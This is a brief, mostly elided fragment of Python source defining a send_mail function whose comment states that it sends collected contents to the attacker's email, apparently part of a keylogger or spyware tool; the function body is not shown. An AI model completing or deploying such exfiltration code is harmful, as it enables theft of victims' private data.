...
def send_mail(email, password, message):	#The send_mail function will send the mail to the attacker i.e. all the contents to the user's mail
	...
	#1st parameter contains the email of sender
	#2nd parameter contains the email of receiver
